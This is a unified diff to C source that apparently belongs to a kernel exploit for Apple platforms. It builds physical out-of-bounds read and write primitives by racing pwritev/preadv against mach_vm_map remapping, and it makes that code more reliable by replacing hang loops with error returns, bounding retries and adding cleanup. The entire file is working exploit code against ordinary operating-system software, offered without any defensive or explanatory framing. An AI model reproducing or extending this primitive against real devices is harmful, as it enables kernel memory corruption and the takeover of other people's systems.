@@ -7,12 +7,13 @@
 #include "surface.h"
 
 // creates physically contiguous mapping in Purplegfxmem and sets marker to it
-void initialize_physical_read_write(mach_vm_size_t contiguous_mapping_size) {
+kern_return_t initialize_physical_read_write(mach_vm_size_t contiguous_mapping_size) {
     g_ctx.pc_size = contiguous_mapping_size;
     kern_return_t kr = create_physically_contiguous_mapping(&g_ctx.pc_object, &g_ctx.pc_address, g_ctx.pc_size);
     if (kr != KERN_SUCCESS) {
         LOG_ERR("create_physically_contiguous_mapping: %s (%d)", mach_error_string(kr), kr);
-        while (1);
+        g_ctx.pc_size = 0;
+        return kr;
     }
 
     // pc -> physically contiguous
@@ -30,9 +31,23 @@ void initialize_physical_read_write(mach_vm_size_t contiguous_mapping_size) {
     atomic_store_explicit(&g_ctx.shared->free_target_size_sync, g_ctx.free_target_size, memory_order_seq_cst);
     atomic_store_explicit(&g_ctx.shared->free_thread_start, 1, memory_order_seq_cst);
     atomic_store_explicit(&g_ctx.shared->go_sync, 1, memory_order_seq_cst);
+    return KERN_SUCCESS;
+}
+
+void physical_oob_cleanup(void) {
+    if (g_ctx.pc_address != 0 && g_ctx.pc_size != 0) {
+        mach_vm_deallocate(mach_task_self(), g_ctx.pc_address, g_ctx.pc_size);
+    }
+    if (g_ctx.pc_object != MACH_PORT_NULL) {
+        mach_port_deallocate(mach_task_self(), g_ctx.pc_object);
+    }
+    g_ctx.pc_address = 0;
+    g_ctx.pc_size = 0;
+    g_ctx.pc_object = MACH_PORT_NULL;
 }
 
 kern_return_t physical_oob_read_mo(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t size, uint64_t offset, uint8_t* buffer) {
+    if (offset + size > 0x4000) return KERN_INVALID_ARGUMENT;
     // target_object_sync here on first pass is set to memory_object from mem entry
     atomic_store_explicit(&g_ctx.shared->target_object_sync, mo, memory_order_seq_cst);
     // offset we're at in the search mapping
@@ -56,13 +71,21 @@ kern_return_t physical_oob_read_mo(mach_port_t mo, mach_vm_offset_t mo_offset, u
         // trigger bug to read oob_offset oob
         w = pwritev(g_ctx.read_fd, &g_ctx.iov, 1, 0x3f00);
         while (atomic_load_explicit(&g_ctx.shared->race_sync, memory_order_seq_cst) == 1);
+        kern_return_t map_error = (kern_return_t)atomic_exchange_explicit(&g_ctx.shared->map_error, 0, memory_order_seq_cst);
+        if (map_error != KERN_SUCCESS) {
+            g_ctx.race_failed = true;
+            atomic_store_explicit(&g_ctx.shared->target_object_sync, 0, memory_order_seq_cst);
+            return map_error;
+        }
         mach_vm_address_t map_addr = g_ctx.pc_address;
         // put physicallly contiguous mapping back
         kern_return_t kr =
             mach_vm_map(mach_task_self(), &map_addr, g_ctx.pc_size, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, g_ctx.pc_object, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
         if (kr != KERN_SUCCESS) {
             LOG_ERR("physical_oob_read_mo: mach_vm_map: %s (%d)", mach_error_string(kr), kr);
-            while (1);
+            g_ctx.race_failed = true;
+            atomic_store_explicit(&g_ctx.shared->target_object_sync, 0, memory_order_seq_cst);
+            return kr;
         }
 
         if (w == -1) {
@@ -84,7 +107,7 @@ kern_return_t physical_oob_read_mo(mach_port_t mo, mach_vm_offset_t mo_offset, u
             usleep(1);
         }
 
-        if (try_idx == 500) {
+        if (try_idx >= g_ctx.oob_race_max_tries) {
             // LOG_DEBUG("we failed");
             break;
         }
@@ -95,16 +118,20 @@ kern_return_t physical_oob_read_mo(mach_port_t mo, mach_vm_offset_t mo_offset, u
 }
 
 // retry until success
-void physical_oob_read_mo_with_retry(mach_port_t memory_object, mach_vm_offset_t seeking_offset, uint64_t oob_size, uint64_t oob_offset, uint8_t* read_buffer) {
-    while (true) {
-        kern_return_t kr = physical_oob_read_mo(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
+// Re-reads only pages already proven by a successful race.
+kern_return_t physical_oob_read_mo_with_retry(mach_port_t memory_object, mach_vm_offset_t seeking_offset, uint64_t oob_size, uint64_t oob_offset, uint8_t* read_buffer) {
+    kern_return_t kr = KERN_FAILURE;
+    for (unsigned attempt = 0; attempt < 8; attempt++) {
+        kr = physical_oob_read_mo(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
         if (kr == KERN_SUCCESS) {
-            break;
+            return KERN_SUCCESS;
         }
+        usleep(100);
     }
+    return kr;
 }
 
-void physical_oob_write_mo(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t size, uint64_t offset, uint8_t* buffer) {
+kern_return_t physical_oob_write_mo(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t size, uint64_t offset, uint8_t* buffer) {
     atomic_store_explicit(&g_ctx.shared->target_object_sync, mo, memory_order_seq_cst);
     atomic_store_explicit(&g_ctx.shared->target_object_offset_sync, mo_offset, memory_order_seq_cst);
 
@@ -118,15 +145,24 @@ void physical_oob_write_mo(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t 
         // write from the fd into (oob) memory
         preadv(g_ctx.write_fd, &g_ctx.iov, 1, 0x3f00);
         while (atomic_load_explicit(&g_ctx.shared->race_sync, memory_order_seq_cst) == 1);
+        kern_return_t map_error = (kern_return_t)atomic_exchange_explicit(&g_ctx.shared->map_error, 0, memory_order_seq_cst);
+        if (map_error != KERN_SUCCESS) {
+            g_ctx.race_failed = true;
+            atomic_store_explicit(&g_ctx.shared->target_object_sync, 0, memory_order_seq_cst);
+            return map_error;
+        }
 
         mach_vm_address_t map_addr = g_ctx.pc_address;
         kern_return_t kr =
             mach_vm_map(mach_task_self(), &map_addr, g_ctx.pc_size, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, g_ctx.pc_object, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
         if (kr != KERN_SUCCESS) {
             LOG_ERR("physical_oob_write_mo: mach_vm_map: %s (%d)", mach_error_string(kr), kr);
-            while (1);
+            g_ctx.race_failed = true;
+            atomic_store_explicit(&g_ctx.shared->target_object_sync, 0, memory_order_seq_cst);
+            return kr;
         }
     }
 
     atomic_store_explicit(&g_ctx.shared->target_object_sync, 0, memory_order_seq_cst);
+    return KERN_SUCCESS;
 }
